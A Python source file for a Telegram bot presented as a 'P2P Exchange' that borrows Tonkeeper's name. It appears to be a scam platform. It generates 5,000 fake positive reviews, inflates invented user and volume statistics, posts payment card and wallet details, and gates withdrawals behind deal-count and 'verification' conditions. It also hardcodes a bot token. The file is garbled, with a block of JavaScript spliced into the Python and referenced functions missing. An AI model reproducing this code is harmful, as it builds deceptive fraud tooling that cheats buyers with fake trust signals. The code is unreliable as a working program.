import asyncio
import json
import os
import uuid
import random
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiohttp import web

# ============================================================
# 1. КОНФИГУРАЦИЯ
# ============================================================
BOT_TOKEN = "8973397612:AAGcMMe1r2DyZTziExnSVyjagdXm7fptrF8"
MASTER_ADMIN_ID = 8855434638
BOT_USERNAME = "tonkeeperp2p_bot"
BOT_NAME = "P2P Exchange"
CHANNEL_LINK = "https://t.me/tonkeeper_news"
MINI_APP_URL = "https://saitminiapp.onrender.com"
SUPPORT_LINK = "@p2psupbot"

# ============================================================
# 2. ИНИЦИАЛИЗАЦИЯ
# ============================================================
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

# ============================================================
# 3. ФАЙЛЫ
# ============================================================
FILES = {
    "deals": "deals.json",
    "admins": "admins.json",
    "balance": "balance.json",
    "reviews": "reviews.json",
    "withdraw": "withdraw_requests.json",
    "verification": "verification_requests.json",
    "verification_sessions": "verification_sessions.json",
    "logs": "logs.json",
    "user_language": "user_language.json",
    "stats": "stats.json",
    "rekvisits": "rekvisits.json"
}

def load_json(file):
    if os.path.exists(file):
        with open(file, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_json(file, data):
    with open(file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

deals = load_json(FILES["deals"])
admins = load_json(FILES["admins"])
balance = load_json(FILES["balance"])
reviews = load_json(FILES["reviews"])
withdraw_requests = load_json(FILES["withdraw"])
verification_requests = load_json(FILES["verification"])
verification_sessions = load_json(FILES["verification_sessions"])
logs = load_json(FILES["logs"])
user_language = load_json(FILES["user_language"])
stats = load_json(FILES["stats"])
rekvisits = load_json(FILES["rekvisits"])

# Значения по умолчанию для статистики
if not stats:
    stats = {"deals_today": 1264, "users": 21374, "reviews": 5427, "volume": 47.6}
    save_json(FILES["stats"], stats)

# Значения по умолчанию для реквизитов
if not rekvisits:
    rekvisits = {
        "TON": "💎 ОПЛАТА TON\n\nПереведите TON на кошелек:\nUQCD3wX5Y5G5d8F5J8K9L0Z1X2C3V4B5N6M7A8S9D0F1G2H3\n\nСумма: {amount} TON",
        "STARS": "⭐️ ОПЛАТА ЗВЁЗДАМИ\n\nОтправьте звёзды в бота: @tonkeeperp2p_bot\n\nСумма: {amount} STARS",
        "RUB": "💰 ОПЛАТА РУБЛЯМИ\n\nПереведите на карту:\n2200 1234 5678 9012\nТинькофф\n\nСумма: {amount} RUB",
        "UAH": "🌐 ОПЛАТА ГРИВНАМИ\n\nПереведите на карту:\n4149 5678 1234 5678\nПриватБанк\n\nСумма: {amount} UAH"
    }
    save_json(FILES["rekvisits"], rekvisits)

# ============================================================
# 4. ГЕНЕРАЦИЯ ОТЗЫВОВ
# ============================================================
def generate_reviews():
    if len(reviews) >= 5000:
        return
    review_texts = [
        "Отличная платформа! Всё работает быстро и надёжно.",
        "Лучший P2P обменник! Рекомендую всем друзьям.",
        "Быстро, удобно, безопасно. Буду пользоваться дальше.",
        "Отличная поддержка! Помогли разобраться с выводом.",
        "Наконец-то нашёл нормальный обменник. Всё честно.",
        "Сделал первую сделку, всё прошло гладко. Спасибо!",
        "За сутки сделал 5 сделок, все успешно завершены.",
        "Очень доволен сервисом. Вывод моментальный.",
        "Пользуюсь уже месяц, ни одной проблемы.",
        "Лучший сервис в Telegram! Успехов разработчикам."
    ]
    for i in range(5000):
        review_id = str(uuid.uuid4())[:8]
        reviews[review_id] = {
            "id": review_id,
            "user": "Аноним",
            "rating": random.randint(4, 5),
            "text": random.choice(review_texts),
            "anonymous": True,
            "date": datetime.now().strftime("%d.%m.%Y %H:%M"),
            "user_id": None
        }
    save_json(FILES["reviews"], reviews)

generate_reviews()

# ============================================================
# 5. ЯЗЫКИ
# ============================================================
##============================================================
## 3. ЯЗЫКИ (ИСПРАВЛЕННАЯ ВЕРСИЯ)
// ============================================================
let currentLang = 'ru';

// Объект с текстами для всех языков
const LANG_TEXT = {
    'ru': {
        'langPrompt': 'Выберите язык',
        'onlineLabel': 'онлайн',
        'statLabel1': 'Сделок сегодня',
        'statLabel2': 'Пользователей',
        'statLabel3': 'Отзывов',
        'statLabel4': 'Объём (TON)',
        'navMain': 'Главная',
        'navCreate': 'Сделка',
        'navDeals': 'Сделки',
        'navReviews': 'Отзывы',
        'navBalance': 'Баланс',
        'navAdmin': 'Админ',
        'welcomeTitle': 'Добро пожаловать!',
        'welcomeText': 'Безопасные P2P сделки с криптовалютой. P2P Exchange — ваш надёжный партнёр.',
        'quickStart': 'Быстрый старт',
        'btnCreateDeal': 'Создать сделку',
        'btnReviews': 'Отзывы',
        'btnBalance': 'Баланс',
        'btnDeals': 'Мои сделки',
        'howWorks': 'Как это работает',
        'step1': '1️⃣ Создайте сделку — опишите товар и сумму',
        'step2': '2️⃣ Отправьте ссылку покупателю',
        'step3': '3️⃣ Покупатель оплачивает на сайте',
        'step4': '4️⃣ Продавец передаёт товар — нажимает кнопку',
        'step5': '5️⃣ Покупатель подтверждает получение',
        'step6': '6️⃣ Деньги зачисляются продавцу',
        'securityText': '🔒 Защита от мошенников • Верификация • 24/7 поддержка',
        'recentReviewsTitle': 'Последние отзывы',
        'loadingText': 'Загрузка...',
        'supportLabel': 'Поддержка',
        'channelLabel': 'Канал',
        'createTitle': 'Создать сделку',
        'createSubtitle': 'Заполните форму',
        'labelProduct': 'Товар или услуга',
        'labelCurrency': 'Валюта',
        'labelAmount': 'Сумма',
        'labelBuyer': 'Username покупателя (без @)',
        'btnCreate': 'Создать сделку',
        'btnBackMain': 'На главную',
        'myDealsTitle': 'Мои сделки',
        'loadingDeals': 'Загрузка...',
        'btnBackMain2': 'На главную',
        'reviewsTitle': 'Отзывы',
        'reviewsSubtitle': 'Оставляйте отзывы после сделок',
        'labelRating': 'Оценка',
        'labelReviewText': 'Отзыв',
        'btnSubmitReview': 'Отправить отзыв',
        'loadingReviews': 'Загрузка...',
        'btnLoadMore': 'Загрузить ещё',
        'balanceTitle': 'Мой баланс',
        'btnWithdraw': 'Вывести средства',
        'withdrawInfo': '💳 Вывод средств',
        'labelWithdrawCurrency': 'Валюта',
        'labelWithdrawDetails': 'Реквизиты',
        'btnConfirmWithdraw': 'Подтвердить вывод',
        'btnBackMain3': 'На главную',
        'adminTitle': 'Админ панель',
        'loadingAdmin': 'Проверка прав...',
        'btnBackMain4': 'На главную',
        'noDeals': 'У вас нет сделок',
        'noReviews': 'Пока нет отзывов',
        'paid': 'Оплачено',
        'waiting': 'Ожидает оплаты',
        'awaiting': 'Ожидает подтверждения',
        'completed': 'Завершено',
        'copyLink': 'Скопировать ссылку',
        'pay': 'Оплатить',
        'sellerDelivered': 'Передал товар',
        'confirmReceipt': 'Подтвердить получение',
        'balanceZero': 'Ваш баланс равен 0. Пополните баланс для вывода.',
        'need2Deals': 'Для вывода нужно провести 2 успешные сделки с одним покупателем. У вас: ',
        'verificationRequired': 'Для вывода необходима верификация. Пройдите проверку.',
        'verificationPassed': 'Все условия выполнены! Вы можете вывести средства.',
        'sessionActive': 'Сессия активна до: ',
        'headerTitle': 'P2P',
        'headerTitleSpan': 'Exchange'
    },
    'en': {
        'langPrompt': 'Choose your language',
        'onlineLabel': 'online',
        'statLabel1': 'Deals today',
        'statLabel2': 'Users',
        'statLabel3': 'Reviews',
        'statLabel4': 'Volume (TON)',
        'navMain': 'Home',
        'navCreate': 'Create',
        'navDeals': 'Deals',
        'navReviews': 'Reviews',
        'navBalance': 'Balance',
        'navAdmin': 'Admin',
        'welcomeTitle': 'Welcome!',
        'welcomeText': 'Secure P2P cryptocurrency deals. P2P Exchange — your trusted partner.',
        'quickStart': 'Quick start',
        'btnCreateDeal': 'Create deal',
        'btnReviews': 'Reviews',
        'btnBalance': 'Balance',
        'btnDeals': 'My deals',
        'howWorks': 'How it works',
        'step1': '1️⃣ Create a deal — describe the product and amount',
        'step2': '2️⃣ Send the link to the buyer',
        'step3': '3️⃣ Buyer pays on the site',
        'step4': '4️⃣ Seller delivers — clicks the button',
        'step5': '5️⃣ Buyer confirms receipt',
        'step6': '6️⃣ Money is credited to the seller',
        'securityText': '🔒 Scam protection • Verification • 24/7 support',
        'recentReviewsTitle': 'Recent reviews',
        'loadingText': 'Loading...',
        'supportLabel': 'Support',
        'channelLabel': 'Channel',
        'createTitle': 'Create deal',
        'createSubtitle': 'Fill in the form',
        'labelProduct': 'Product or service',
        'labelCurrency': 'Currency',
        'labelAmount': 'Amount',
        'labelBuyer': 'Buyer username (without @)',
        'btnCreate': 'Create deal',
        'btnBackMain': 'Main menu',
        'myDealsTitle': 'My deals',
        'loadingDeals': 'Loading...',
        'btnBackMain2': 'Main menu',
        'reviewsTitle': 'Reviews',
        'reviewsSubtitle': 'Leave reviews after deals',
        'labelRating': 'Rating',
        'labelReviewText': 'Review',
        'btnSubmitReview': 'Submit review',
        'loadingReviews': 'Loading...',
        'btnLoadMore': 'Load more',
        'balanceTitle': 'My balance',
        'btnWithdraw': 'Withdraw funds',
        'withdrawInfo': '💳 Withdraw funds',
        'labelWithdrawCurrency': 'Currency',
        'labelWithdrawDetails': 'Details',
        'btnConfirmWithdraw': 'Confirm withdrawal',
        'btnBackMain3': 'Main menu',
        'adminTitle': 'Admin panel',
        'loadingAdmin': 'Checking rights...',
        'btnBackMain4': 'Main menu',
        'noDeals': 'You have no deals',
        'noReviews': 'No reviews yet',
        'paid': 'Paid',
        'waiting': 'Waiting for payment',
        'awaiting': 'Awaiting confirmation',
        'completed': 'Completed',
        'copyLink': 'Copy link',
        'pay': 'Pay',
        'sellerDelivered': 'Delivered',
        'confirmReceipt': 'Confirm receipt',
        'balanceZero': 'Your balance is 0. Please top up to withdraw.',
        'need2Deals': 'You need 2 successful deals with the same buyer. You have: ',
        'verificationRequired': 'Verification required to withdraw. Please verify.',
        'verificationPassed': 'All conditions met! You can withdraw.',
        'sessionActive': 'Session active until: ',
        'headerTitle': 'P2P',
        'headerTitleSpan': 'Exchange'
    },
    'zh': {
        'langPrompt': '选择您的语言',
        'onlineLabel': '在线',
        'statLabel1': '今日交易',
        'statLabel2': '用户',
        'statLabel3': '评论',
        'statLabel4': '交易量 (TON)',
        'navMain': '主页',
        'navCreate': '创建',
        'navDeals': '交易',
        'navReviews': '评论',
        'navBalance': '余额',
        'navAdmin': '管理员',
        'welcomeTitle': '欢迎！',
        'welcomeText': '安全的P2P加密货币交易。P2P Exchange — 您值得信赖的合作伙伴。',
        'quickStart': '快速开始',
        'btnCreateDeal': '创建交易',
        'btnReviews': '评论',
        'btnBalance': '余额',
        'btnDeals': '我的交易',
        'howWorks': '运作方式',
        'step1': '1️⃣ 创建交易 — 描述商品和金额',
        'step2': '2️⃣ 发送链接给买家',
        'step3': '3️⃣ 买家在网站上支付',
        'step4': '4️⃣ 卖家交付 — 点击按钮',
        'step5': '5️⃣ 买家确认收到',
        'step6': '6️⃣ 资金转入卖家账户',
        'securityText': '🔒 防诈骗保护 • 验证 • 24/7支持',
        'recentReviewsTitle': '最新评论',
        'loadingText': '加载中...',
        'supportLabel': '支持',
        'channelLabel': '频道',
        'createTitle': '创建交易',
        'createSubtitle': '填写表格',
        'labelProduct': '商品或服务',
        'labelCurrency': '货币',
        'labelAmount': '金额',
        'labelBuyer': '买家用户名 (不含@)',
        'btnCreate': '创建交易',
        'btnBackMain': '主菜单',
        'myDealsTitle': '我的交易',
        'loadingDeals': '加载中...',
        'btnBackMain2': '主菜单',
        'reviewsTitle': '评论',
        'reviewsSubtitle': '交易后留下评论',
        'labelRating': '评分',
        'labelReviewText': '评论',
        'btnSubmitReview': '提交评论',
        'loadingReviews': '加载中...',
        'btnLoadMore': '加载更多',
        'balanceTitle': '我的余额',
        'btnWithdraw': '提取资金',
        'withdrawInfo': '💳 提取资金',
        'labelWithdrawCurrency': '货币',
        'labelWithdrawDetails': '详情',
        'btnConfirmWithdraw': '确认提取',
        'btnBackMain3': '主菜单',
        'adminTitle': '管理面板',
        'loadingAdmin': '检查权限...',
        'btnBackMain4': '主菜单',
        'noDeals': '您没有交易',
        'noReviews': '暂无评论',
        'paid': '已付款',
        'waiting': '等待付款',
        'awaiting': '等待确认',
        'completed': '已完成',
        'copyLink': '复制链接',
        'pay': '支付',
        'sellerDelivered': '已交付',
        'confirmReceipt': '确认收到',
        'balanceZero': '您的余额为0。请充值后提取。',
        'need2Deals': '需要与同一买家完成2笔交易。您有: ',
        'verificationRequired': '提取需要验证。请进行验证。',
        'verificationPassed': '所有条件已满足！您可以提取资金。',
        'sessionActive': '会话有效期至: ',
        'headerTitle': 'P2P',
        'headerTitleSpan': '交易所'
    },
    'ar': {
        'langPrompt': 'اختر لغتك',
        'onlineLabel': 'متصل',
        'statLabel1': 'صفقات اليوم',
        'statLabel2': 'مستخدمين',
        'statLabel3': 'مراجعات',
        'statLabel4': 'الحجم (TON)',
        'navMain': 'الرئيسية',
        'navCreate': 'إنشاء',
        'navDeals': 'صفقات',
        'navReviews': 'مراجعات',
        'navBalance': 'الرصيد',
        'navAdmin': 'مدير',
        'welcomeTitle': 'مرحباً!',
        'welcomeText': 'صفقات P2P آمنة للعملات المشفرة. P2P Exchange — شريكك الموثوق.',
        'quickStart': 'بداية سريعة',
        'btnCreateDeal': 'إنشاء صفقة',
        'btnReviews': 'مراجعات',
        'btnBalance': 'الرصيد',
        'btnDeals': 'صفقاتي',
        'howWorks': 'كيف يعمل',
        'step1': '1️⃣ أنشئ صفقة — صف المنتج والمبلغ',
        'step2': '2️⃣ أرسل الرابط للمشتري',
        'step3': '3️⃣ المشتري يدفع على الموقع',
        'step4': '4️⃣ البائع يسلم — يضغط الزر',
        'step5': '5️⃣ المشتري يؤكد الاستلام',
        'step6': '6️⃣ تضاف الأموال إلى رصيد البائع',
        'securityText': '🔒 حماية من المحتالين • تحقق • دعم 24/7',
        'recentReviewsTitle': 'أحدث المراجعات',
        'loadingText': 'جار التحميل...',
        'supportLabel': 'الدعم',
        'channelLabel': 'القناة',
        'createTitle': 'إنشاء صفقة',
        'createSubtitle': 'املأ النموذج',
        'labelProduct': 'المنتج أو الخدمة',
        'labelCurrency': 'العملة',
        'labelAmount': 'المبلغ',
        'labelBuyer': 'اسم مستخدم المشتري (بدون @)',
        'btnCreate': 'إنشاء صفقة',
        'btnBackMain': 'القائمة الرئيسية',
        'myDealsTitle': 'صفقاتي',
        'loadingDeals': 'جار التحميل...',
        'btnBackMain2': 'القائمة الرئيسية',
        'reviewsTitle': 'مراجعات',
        'reviewsSubtitle': 'اترك مراجعة بعد الصفقات',
        'labelRating': 'التقييم',
        'labelReviewText': 'المراجعة',
        'btnSubmitReview': 'إرسال المراجعة',
        'loadingReviews': 'جار التحميل...',
        'btnLoadMore': 'تحميل المزيد',
        'balanceTitle': 'رصيدي',
        'btnWithdraw': 'سحب الأموال',
        'withdrawInfo': '💳 سحب الأموال',
        'labelWithdrawCurrency': 'العملة',
        'labelWithdrawDetails': 'التفاصيل',
        'btnConfirmWithdraw': 'تأكيد السحب',
        'btnBackMain3': 'القائمة الرئيسية',
        'adminTitle': 'لوحة المدير',
        'loadingAdmin': 'فحص الصلاحيات...',
        'btnBackMain4': 'القائمة الرئيسية',
        'noDeals': 'ليس لديك صفقات',
        'noReviews': 'لا توجد مراجعات بعد',
        'paid': 'مدفوع',
        'waiting': 'انتظار الدفع',
        'awaiting': 'انتظار التأكيد',
        'completed': 'مكتمل',
        'copyLink': 'نسخ الرابط',
        'pay': 'دفع',
        'sellerDelivered': 'تم التسليم',
        'confirmReceipt': 'تأكيد الاستلام',
        'balanceZero': 'رصيدك 0. يرجى الإيداع للسحب.',
        'need2Deals': 'تحتاج صفقتين ناجحتين مع نفس المشتري. لديك: ',
        'verificationRequired': 'السحب يحتاج التحقق. يرجى التحقق.',
        'verificationPassed': 'جميع الشروط متوفرة! يمكنك السحب.',
        'sessionActive': 'الجلسة نشطة حتى: ',
        'headerTitle': 'P2P',
        'headerTitleSpan': 'صراف'
    }
};

function applyLanguage(lang) {
    const t = LANG_TEXT[lang] || LANG_TEXT['ru'];
    
    // Обновляем элементы по ID
    const elements = {
        'langPrompt': document.getElementById('langPrompt'),
        'onlineLabel': document.getElementById('onlineLabel'),
        'statLabel1': document.getElementById('statLabel1'),
        'statLabel2': document.getElementById('statLabel2'),
        'statLabel3': document.getElementById('statLabel3'),
        'statLabel4': document.getElementById('statLabel4'),
        'navMain': document.getElementById('navMain'),
        'navCreate': document.getElementById('navCreate'),
        'navDeals': document.getElementById('navDeals'),
        'navReviews': document.getElementById('navReviews'),
        'navBalance': document.getElementById('navBalance'),
        'navAdmin': document.getElementById('navAdmin'),
        'welcomeTitle': document.getElementById('welcomeTitle'),
        'welcomeText': document.getElementById('welcomeText'),
        'quickStart': document.getElementById('quickStart'),
        'btnCreateDeal': document.getElementById('btnCreateDeal'),
        'btnReviews': document.getElementById('btnReviews'),
        'btnBalance': document.getElementById('btnBalance'),
        'btnDeals': document.getElementById('btnDeals'),
        'howWorks': document.getElementById('howWorks'),
        'securityText': document.getElementById('securityText'),
        'recentReviewsTitle': document.getElementById('recentReviewsTitle'),
        'loadingText': document.getElementById('loadingText'),
        'supportLabel': document.getElementById('supportLabel'),
        'channelLabel': document.getElementById('channelLabel'),
        'createTitle': document.getElementById('createTitle'),
        'createSubtitle': document.getElementById('createSubtitle'),
        'labelProduct': document.getElementById('labelProduct'),
        'labelCurrency': document.getElementById('labelCurrency'),
        'labelAmount': document.getElementById('labelAmount'),
        'labelBuyer': document.getElementById('labelBuyer'),
        'btnCreate': document.getElementById('btnCreate'),
        'btnBackMain': document.getElementById('btnBackMain'),
        'myDealsTitle': document.getElementById('myDealsTitle'),
        'loadingDeals': document.getElementById('loadingDeals'),
        'btnBackMain2': document.getElementById('btnBackMain2'),
        'reviewsTitle': document.getElementById('reviewsTitle'),
        'reviewsSubtitle': document.getElementById('reviewsSubtitle'),
        'labelRating': document.getElementById('labelRating'),
        'labelReviewText': document.getElementById('labelReviewText'),
        'btnSubmitReview': document.getElementById('btnSubmitReview'),
        'loadingReviews': document.getElementById('loadingReviews'),
        'btnLoadMore': document.getElementById('btnLoadMore'),
        'balanceTitle': document.getElementById('balanceTitle'),
        'btnWithdraw': document.getElementById('btnWithdraw'),
        'withdrawInfo': document.getElementById('withdrawInfo'),
        'labelWithdrawCurrency': document.getElementById('labelWithdrawCurrency'),
        'labelWithdrawDetails': document.getElementById('labelWithdrawDetails'),
        'btnConfirmWithdraw': document.getElementById('btnConfirmWithdraw'),
        'btnBackMain3': document.getElementById('btnBackMain3'),
        'adminTitle': document.getElementById('adminTitle'),
        'loadingAdmin': document.getElementById('loadingAdmin'),
        'btnBackMain4': document.getElementById('btnBackMain4')
    };
    
    // Обновляем только существующие элементы
    for (const [key, el] of Object.entries(elements)) {
        if (el && t[key] !== undefined) {
            el.textContent = t[key];
        }
    }
    
    // Обновляем шаги
    for (let i = 1; i <= 6; i++) {
        const el = document.getElementById('step' + i);
        if (el && t['step' + i] !== undefined) {
            el.innerHTML = t['step' + i];
        }
    }
    
    // Обновляем хедер
    const headerTitle = document.getElementById('headerTitle');
    const headerTitleSpan = document.getElementById('headerTitleSpan');
    if (headerTitle && t.headerTitle) headerTitle.textContent = t.headerTitle;
    if (headerTitleSpan && t.headerTitleSpan) headerTitleSpan.textContent = t.headerTitleSpan;
}

function setLanguage(lang) {
    currentLang = lang;
    const overlay = document.getElementById('languageOverlay');
    if (overlay) overlay.classList.remove('active');
    localStorage.setItem('lang', lang);
    applyLanguage(lang);
    showToast('✅ ' + (lang === 'ru' ? 'Язык установлен' : 'Language set'), 'success');
    loadMainData(); // Перезагружаем данные
}

// При загрузке страницы проверяем сохранённый язык
if (localStorage.getItem('lang')) {
    setLanguage(localStorage.getItem('lang'));
} else {
    // Если язык не сохранён, показываем overlay
    document.getElementById('languageOverlay').classList.add('active');
}
# ============================================================
# 6. ПОМОЩНИКИ
# ============================================================
def is_admin(user_id: int) -> bool:
    return user_id == MASTER_ADMIN_ID or str(user_id) in admins

def get_balance(user_id: int):
    uid = str(user_id)
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
        save_json(FILES["balance"], balance)
    return balance[uid]

def add_balance(user_id: int, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
    balance[uid][curr] = balance[uid].get(curr, 0) + amount
    save_json(FILES["balance"], balance)

def get_user_language(user_id: int) -> str:
    uid = str(user_id)
    return user_language.get(uid, "ru")

def set_user_language(user_id: int, lang: str):
    user_language[str(user_id)] = lang
    save_json(FILES["user_language"], user_language)

def add_log(action: str, data: dict):
    log_id = str(uuid.uuid4())[:8]
    log_entry = {
        "id": log_id,
        "action": action,
        "data": data,
        "time": datetime.now().isoformat()
    }
    logs[log_id] = log_entry
    save_json(FILES["logs"], logs)
    
    try:
        asyncio.create_task(send_log_to_admin(action, data))
    except:
        pass

async def send_log_to_admin(action: str, data: dict):
    try:
        text = f"📋 <b>ЛОГ</b> #{action}\n\n"
        text += f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        for key, value in data.items():
            if key == 'user_id':
                text += f"👤 ID: {value}\n"
            elif key == 'username':
                text += f"👤 Username: @{value}\n"
            elif key == 'deal_id':
                text += f"🆔 Сделка: #{value}\n"
            elif key == 'amount':
                text += f"💰 Сумма: {value}\n"
            elif key == 'currency':
                text += f"💱 Валюта: {value}\n"
            elif key == 'product':
                text += f"📦 Товар: {value}\n"
            elif key == 'buyer_username':
                text += f"👤 Покупатель: @{value}\n"
            elif key == 'seller_username':
                text += f"👤 Продавец: @{value}\n"
            elif key == 'phone':
                text += f"📱 Телефон: {value}\n"
            elif key == 'status':
                text += f"📊 Статус: {value}\n"
            else:
                text += f"📎 {key}: {value}\n"
        await bot.send_message(MASTER_ADMIN_ID, text[:4000])
    except Exception as e:
        print(f"Ошибка лога: {e}")

def update_stats():
    """Обновляет статистику"""
    global stats
    stats["deals_today"] = max(stats.get("deals_today", 1264) + random.randint(0, 3), 1264)
    stats["users"] = max(stats.get("users", 21374) + random.randint(0, 5), 21374)
    stats["reviews"] = max(stats.get("reviews", 5427) + random.randint(0, 2), 5427)
    stats["volume"] = max(stats.get("volume", 47.6) + random.uniform(0, 0.1), 47.6)
    stats["volume"] = round(stats["volume"], 1)
    save_json(FILES["stats"], stats)

# ============================================================
# 7. КЛАВИАТУРЫ
# ============================================================
def main_menu_keyboard(user_id: int):
    lang = get_user_language(user_id)
    buttons = [
        [
            InlineKeyboardButton(text=f"📱 {get_text(lang, 'create_deal')}", web_app=WebAppInfo(url=MINI_APP_URL)),
            InlineKeyboardButton(text=f"💰 {get_text(lang, 'my_balance')}", callback_data="menu_balance"),
        ],
        [
            InlineKeyboardButton(text=f"📊 {get_text(lang, 'my_deals')}", callback_data="menu_deals"),
            InlineKeyboardButton(text=f"📖 {get_text(lang, 'how_to_deal')}", callback_data="how_to_deal"),
        ],
        [
            InlineKeyboardButton(text=f"⭐️ {get_text(lang, 'faq')}", callback_data="menu_reviews"),
            InlineKeyboardButton(text=f"📢 {get_text(lang, 'channel')}", callback_data="menu_channel"),
        ],
        [
            InlineKeyboardButton(text=f"🌐 {get_text(lang, 'select_language')}", callback_data="select_language"),
        ]
    ]
    if is_admin(user_id):
        buttons.append([
            InlineKeyboardButton(text=f"👑 {get_text(lang, 'admin_panel')}", callback_data="menu_admin"),
        ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def deal_link_keyboard(deal_id: str, user_id: int):
    """Клавиатура для перехода в Mini App"""
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text=f"🔓 {get_text(lang, 'open_deal')}",
            web_app=WebAppInfo(url=MINI_APP_URL)
        )],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

# ============================================================
# 8. ОБРАБОТЧИКИ БОТА
# ============================================================
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.text and message.text.startswith("/start deal_"):
        deal_id = message.text.split("_")[1]
        await handle_deal_link(message, deal_id)
        return
    
    uid = str(message.from_user.id)
    if uid in user_language:
        await send_welcome(message)
        return
    
    await message.answer(
        f"🌐 {get_text('ru', 'choose_language_prompt')}",
        reply_markup=language_keyboard()
    )

async def send_welcome(message: types.Message):
    lang = get_user_language(message.from_user.id)
    text = f"""🔥 <b>{get_text(lang, 'bot_name')}</b> 🔥

{get_text(lang, 'bot_desc')}
• {get_text(lang, 'feature1')}
• {get_text(lang, 'feature2')}
• {get_text(lang, 'feature3')}
• {get_text(lang, 'feature4')}

📊 {get_text(lang, 'how_it_works')}:
1️⃣ {get_text(lang, 'step1')}
2️⃣ {get_text(lang, 'step2')}
3️⃣ {get_text(lang, 'step3')}
4️⃣ {get_text(lang, 'step4')}
5️⃣ {get_text(lang, 'step5')}
6️⃣ {get_text(lang, 'step6')}
7️⃣ {get_text(lang, 'step7')}

📢 {get_text(lang, 'our_channel')}: {CHANNEL_LINK}
🆘 {get_text(lang, 'support')}: {get_text(lang, 'support_contact')}

🔥 {get_text(lang, 'start_now')} 🚀"""
    await message.answer(text, reply_markup=main_menu_keyboard(message.from_user.id))

async def handle_deal_link(message: types.Message, deal_id: str):
    lang = get_user_language(message.from_user.id)
    if lang is None:
        lang = "ru"
    
    if deal_id not in deals:
        await message.answer(f"❌ {get_text(lang, 'deal_not_found')}")
        return

    deal = deals[deal_id]
    
    if message.from_user.username and message.from_user.username.lower() != deal["buyer_username"].lower():
        await message.answer(
            f"❌ {get_text(lang, 'access_denied')}!\n\n"
            f"{get_text(lang, 'deal')} #{deal_id} {get_text(lang, 'for_user')} @{deal['buyer_username']}"
        )
        return

    deal["buyer_id"] = message.from_user.id
    save_json(FILES["deals"], deals)

    add_log("buyer_entered_deal", {
        "user_id": message.from_user.id,
        "username": message.from_user.username,
        "deal_id": deal_id,
        "product": deal["product"],
        "amount": deal["amount"],
        "currency": deal["currency"]
    })

    text = f"""🔥 <b>{get_text(lang, 'deal_ready')}</b>

📋 <b>{get_text(lang, 'deal_info')}</b>
🆔 <b>ID:</b> #{deal_id}
📦 <b>{get_text(lang, 'product')}:</b> {deal['product']}
💰 <b>{get_text(lang, 'amount')}:</b> {deal['amount']} {deal['currency']}
👤 <b>{get_text(lang, 'seller')}:</b> @{deal['seller_username']}
📊 <b>{get_text(lang, 'status')}:</b> {get_text(lang, 'status_waiting')}

{get_text(lang, 'click_to_open')}"""

    await message.answer(
        text,
        reply_markup=deal_link_keyboard(deal_id, message.from_user.id)
    )

def language_keyboard():
    buttons = []
    for lang_code, lang_name in LANGUAGES.items():
        buttons.append([InlineKeyboardButton(text=lang_name, callback_data=f"set_lang_{lang_code}")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

@dp.callback_query(lambda c: c.data.startswith("set_lang_"))
async def set_language(callback: types.CallbackQuery):
    lang = callback.data.split("_")[2]
    set_user_language(callback.from_user.id, lang)
    await callback.answer()
    await send_welcome(callback.message)

@dp.callback_query(lambda c: c.data == "select_language")
async def select_language(callback: types.CallbackQuery):
    await callback.message.edit_text(
        f"🌐 {get_text('ru', 'choose_language_prompt')}",
        reply_markup=language_keyboard()
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "back_to_main")
async def back_to_main(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    try:
        await callback.message.edit_text(
            f"🔥 <b>P2P Exchange</b> 🔥\n\n{get_text(lang, 'choose_action')}:",
            reply_markup=main_menu_keyboard(callback.from_user.id)
        )
    except:
        await callback.message.answer(
            f"🔥 <b>P2P Exchange</b> 🔥\n\n{get_text(lang, 'choose_action')}:",
            reply_markup=main_menu_keyboard(callback.from_user.id)
        )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "menu_channel")
async def menu_channel(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    text = f"""📢 {get_text(lang, 'our_channel')}

🔥 {get_text(lang, 'subscribe')}:
{CHANNEL_LINK}

🚀 {get_text(lang, 'click_subscribe')}"""
    await callback.message.edit_text(text, reply_markup=back_to_main_keyboard(callback.from_user.id))
    await callback.answer()

@dp.callback_query(lambda c: c.data == "how_to_deal")
async def how_to_deal(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    text = get_text(lang, 'how_to_deal_text')
    await callback.message.edit_text(text, reply_markup=back_to_main_keyboard(callback.from_user.id))
    await callback.answer()

def back_to_main_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

@dp.callback_query(lambda c: c.data == "menu_balance")
async def menu_balance(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    bal = get_balance(callback.from_user.id)
    text = f"""💰 <b>{get_text(lang, 'your_balance')}</b>

💎 TON: {bal.get('ton', 0)}
⭐️ STARS: {bal.get('stars', 0)}
💰 RUB: {bal.get('rub', 0)}
🌐 UAH: {bal.get('uah', 0)}

📊 Сделок завершено: {sum(bal.get('deal_partners', {}).values())}"""
    await callback.message.edit_text(text, reply_markup=back_to_main_keyboard(callback.from_user.id))
    await callback.answer()

@dp.callback_query(lambda c: c.data == "menu_deals")
